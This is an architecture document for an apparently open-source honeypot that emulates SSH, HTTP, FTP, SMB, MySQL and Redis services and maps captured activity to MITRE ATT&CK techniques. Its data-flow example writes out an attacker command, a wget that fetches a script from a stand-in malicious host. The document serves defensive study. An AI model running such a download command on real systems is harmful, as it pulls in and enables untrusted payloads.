# Architecture

## High Level Architecture

```
                    ┌─────────────────────────────────────────────┐
    Attackers       │              Hive Backend                   │
                    │                                             │
  ┌──────┐         │  ┌──────┐  ┌──────┐  ┌──────┐  ┌──────┐   │
  │ SSH  │────2222──│──│ sshd │  │ httpd│  │ ftpd │  │ smbd │   │
  │Client│         │  └──┬───┘  └──┬───┘  └──┬───┘  └──┬───┘   │
  └──────┘         │     │         │         │         │        │
  ┌──────┐         │  ┌──┴───┐  ┌──┴───┐                        │
  │MySQL │────3307──│──│mysqld│  │redisd│                        │
  │Client│         │  └──┬───┘  └──┬───┘                        │
  └──────┘         │     │         │                             │
                   │     ▼         ▼                             │
                   │  ┌─────────────────┐                        │
                   │  │    Event Bus    │  (fan-out pub/sub)      │
                   │  │  topic: all     │                        │
                   │  └────────┬────────┘                        │
                   │           │                                 │
                   │     ┌─────┴─────┐                           │
                   │     │ Processor │  (4 worker goroutines)    │
                   │     │ ┌───────┐ │                           │
                   │     │ │GeoIP  │ │  enrich with location     │
                   │     │ │MITRE  │ │  detect techniques        │
                   │     │ │Store  │ │  persist to PostgreSQL    │
                   │     │ │Stream │ │  publish to Redis stream  │
                   │     │ └───────┘ │                           │
                   │     └───────────┘                           │
                   │                                             │
                   │  ┌─────────────────┐                        │
                   │  │   REST API      │  Chi router :8000      │
                   │  │   WebSocket     │  /ws/events             │
                   │  └─────────────────┘                        │
                   └──────────────┬──────────────────────────────┘
                                  │
                   ┌──────────────┴──────────────────┐
                   │         Frontend                │
                   │   React 19 + TypeScript         │
                   │   ┌────────────────────┐        │
                   │   │ Dashboard          │        │
                   │   │ Event Table        │        │
                   │   │ Session Replay     │        │
                   │   │ MITRE Heatmap      │        │
                   │   │ Intel Export       │        │
                   │   └────────────────────┘        │
                   └─────────────────────────────────┘
```

## Component Breakdown

### Honeypot Services (`internal/sshd/`, `httpd/`, etc.)

Each service implements the `types.Service` interface with two methods: `Name()` and `Start(ctx)`. They accept connections on their configured port, speak enough protocol to sustain interaction, and publish events to the event bus. None of them touch the database directly.

The SSH service is the most complex, with an in-memory filesystem, 25+ fake commands, session recording in asciicast format, and MOTD banners that mimic real Ubuntu servers. The SMB service is the simplest: it reads one NetBIOS frame, sends a negotiate response, and closes.

### Event Bus (`internal/event/bus.go`)

The bus is the central nervous system. Every service publishes events to named topics (auth, command, connect, scan, exploit). Subscribers receive events on buffered channels. Publishing is non-blocking: if a subscriber's channel is full, the event is dropped rather than back-pressuring the producer.

This design means a slow WebSocket client or a backed-up database writer can never slow down the honeypot services themselves. Attackers always get a responsive experience, which keeps them engaged longer and produces more intelligence.

### Event Processor (`internal/event/processor.go`)

A pool of worker goroutines consumes events from the bus and runs them through an enrichment pipeline:

1. GeoIP lookup adds country, city, ASN, and coordinates to each event's source IP
2. MITRE technique detector evaluates both single-event rules (command patterns) and multi-event sliding windows (brute force detection), returning fully populated `MITREDetection` objects with tactic, confidence, and evidence already filled in
3. PostgreSQL store persists five things per event: the event itself, one `mitre_detections` row per detected technique, a `credentials` row for auth events (username, password, auth method extracted from `ServiceData`), an `attackers` upsert (incrementing event count, updating last-seen and geo), and an `iocs` upsert for the source IP
4. Redis streamer publishes to a stream for real-time consumers

### Storage Layer (`internal/store/`)

PostgreSQL stores all persistent data: events, sessions, attackers, credentials, IOCs, and MITRE detections. The schema uses monthly range partitioning on event and session tables for efficient time-range queries. GIN indexes on JSONB fields and tags arrays enable fast filtering.

Redis serves as the real-time streaming layer. Events are published to a Redis stream (XADD) with a configurable max length. External consumers can read from this stream independently of the dashboard.

### Intelligence Layer (`internal/intel/`, `internal/mitre/`)

The MITRE detector maintains per-IP state to detect multi-event patterns. It tracks authentication attempts in a sliding window (5 attempts in 5 minutes triggers brute force detection) and service connections (3 different services in 60 seconds triggers service scan detection).

The IOC extractor pulls IP addresses, URLs, domains, and user-agent strings from event data. Extracted IOCs are deduplicated by type and value, with confidence scores based on how they were observed (exploit attempts get 95%, passive connections get 50%).

### Dashboard API (`internal/api/`)

A Chi-based HTTP server exposes REST endpoints for the frontend and a WebSocket endpoint for real-time streaming. The WebSocket handler subscribes to the event bus and forwards events as JSON frames. The REST endpoints query PostgreSQL through the store interface.

## Data Flow

A complete data flow from attacker action to dashboard display:

```
1. Attacker runs `wget http://evil.com/bot.sh` in SSH shell

2. sshd/commands.go dispatches to handleWget()
   - Returns fake "Connecting..." output to attacker
   - Publishes Event{EventType: EventCommand, ServiceData: {"command": "wget ..."}}
   - Records output bytes to asciicast recorder

3. Event Bus fans out to all subscribers
   - Processor worker pool picks it up
   - WebSocket clients receive it immediately

4. Processor pipeline:
   a. GeoIP: resolves source IP to country/city/ASN
   b. MITRE detector: "wget" matches isToolTransfer() -> T1105 (Ingress Tool Transfer), tactic "command-and-control", returned as a full MITREDetection object
   c. Store: INSERT events; INSERT mitre_detections (T1105 row); UPSERT attackers (increment event count); UPSERT iocs (source IP as IOCIPv4)
   d. Redis: XADD to honeypot:events stream

5. WebSocket pushes JSON event to connected dashboard clients
   - React frontend receives via zustand WebSocket store
   - Event appears in live feed component
   - Stats auto-refresh via TanStack Query polling
```

## Design Patterns

### Fan-out Pub/Sub

The event bus uses fan-out: every published event goes to every subscriber whose topic filter matches. This is intentionally simple. There is no message acknowledgment, no replay, and no persistence in the bus itself. The bus is a coordination mechanism, not a message queue.

Trade-off: dropped events under load. If a subscriber's buffer fills up, events are silently dropped. For a honeypot this is acceptable since the honeypot services are the source of truth (they have all the context), and the processor is the persistence layer. The bus just connects them.

### Interface-based Dependency Injection

The processor depends on interfaces (`GeoResolver`, `TechniqueDetector`, `DataStore`, `EventStreamer`), not concrete types. `DataStore` is broader than a single-method interface: it covers `InsertEvent`, `InsertCredential`, `InsertDetection`, `UpsertAttacker`, and `UpsertIOC`. Each component can be tested independently with mock implementations, and each interface is defined in the consuming package (`event/processor.go`) so the dependency arrow points inward — concrete store types in `internal/store/` satisfy the interface without importing the event package.

### Service Interface Pattern

All six honeypots and the API server implement the same two-method interface. The serve command creates them conditionally based on config flags and runs them all in an errgroup. Adding a new honeypot means implementing `Name()` and `Start(ctx)` and registering it in serve.go.

## Data Models

### Event (the core type)

Every interaction produces an Event. It carries a service type, event type, source IP, session ID, and a `ServiceData` field (JSON) for protocol-specific data. SSH commands, HTTP headers, FTP paths, and MySQL queries all go into ServiceData.

### Session

Groups events from a single attacker connection. Tracks start/end times, command count, login status, MITRE techniques detected, and a threat score. SSH sessions can last minutes and produce dozens of events. HTTP "sessions" are one event per request.

### Attacker

Aggregates data across all sessions from a single IP. Tracks first/last seen timestamps, total events, geo information, and the detected tool family (hydra, nmap, metasploit, etc.).

## Design Decisions

**Raw protocol implementations over libraries**: MySQL and FTP use hand-written wire protocol handlers instead of go-mysql or goftp libraries. This gives full control over what data is captured and avoids coupling to library APIs that may change. It also makes the code more educational since you see exactly what bytes go over the wire.

**Accept-all authentication**: Every honeypot service accepts any credentials. The alternative, selective acceptance, would capture fewer credential pairs and potentially discourage attackers from continuing. The Cowrie project switched from selective to accept-all and reported a 3x increase in post-authentication data collection.

**Monthly partitioning without TimescaleDB**: Plain PostgreSQL range partitioning keeps the Docker setup simple (standard postgres:17-alpine image). TimescaleDB would add better automatic partition management and continuous aggregates but requires a custom Docker image.

**SMB negotiate-only**: A full SMB2 implementation would require 15+ message types across session setup, tree connect, create, read, write, and close. The negotiate phase alone captures scanning activity (the primary signal from SMB honeypots) and tool identification via dialect negotiation.

## Deployment Architecture

```
┌─────────────────────────────────────────────────┐
│  Docker Compose                                  │
│                                                  │
│  ┌──────────┐  ┌──────────┐  ┌──────────────┐  │
│  │PostgreSQL│  │  Redis   │  │   Backend    │  │
│  │  :5432   │  │  :6379   │  │ :2222 (SSH)  │  │
│  │          │  │ (infra)  │  │ :8080 (HTTP) │  │
│  └──────────┘  └──────────┘  │ :2121 (FTP)  │  │
│                               │ :4450 (SMB)  │  │
│  ┌──────────────────────┐    │ :3307 (MySQL)│  │
│  │     Frontend         │    │ :6380 (Redis)│  │
│  │  nginx + React SPA   │    │ :8000 (API)  │  │
│  │       :3000          │    └──────────────┘  │
│  └──────────────────────┘                       │
└─────────────────────────────────────────────────┘
```

The infra Redis on port 6379 (internal only) handles event streaming and caching. The honeypot Redis on port 6380 (exposed) is the redisd service that attackers connect to. These are completely separate concerns.

## Limitations

- No TLS termination for honeypot services (attackers connecting via HTTPS see a plaintext HTTP server)
- No distributed deployment (single-sensor architecture, no multi-node coordination)
- SMB captures connection metadata but no file operation data
- No malware analysis (captured files are stored but not detonated or scanned)
- WebSocket subscribers accumulate without cleanup when clients disconnect (acceptable for dashboard use but would need fixing for production deployment)
